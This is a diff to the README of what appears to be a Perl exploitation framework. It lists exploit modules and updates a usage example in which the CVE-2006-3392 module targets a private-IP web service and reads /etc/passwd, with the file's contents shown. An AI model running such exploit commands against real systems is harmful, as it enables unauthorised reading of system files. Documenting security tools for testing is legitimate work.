@@ -64,13 +64,22 @@ Description: Exploit for shellshock vuln
 Module: Exploit::Subdomain_Takeover_Check
 Description: A checker for the possibility of subdomain takeover attack
 =================================================
-
 [...]
 ```
 
 ```
 # Using an exploit
-$ perl spellbook.pl -m Exploits::CVE_2006_3392 -t http://172.30.0.15:10000/ -p /etc/passwd
+$ perl spellbook.pl -m Exploit::CVE_2006_3392 --help
+
+Exploit::CVE_2006_3392
+=======================
+-h, --help     See this menu
+-t, --target   Define a target
+-f, --file     Define a file to read
+```
+
+```
+$ perl spellbook.pl -m Exploit::CVE_2006_3392 -t http://172.30.0.15:10000/ -f /etc/passwd
 
 root:x:0:0:root:/root:/bin/bash
 daemon:x:1:1:daemon:/usr/sbin:/bin/sh
@@ -79,7 +88,6 @@ sys:x:3:3:sys:/dev:/bin/sh
 sync:x:4:65534:sync:/bin:/bin/sync
 games:x:5:60:games:/usr/games:/bin/sh
 [...]
-
 ```
 
 If you are interested in developing new modules, a good start point is to read the [development guide](/wiki/Developer-Guide).
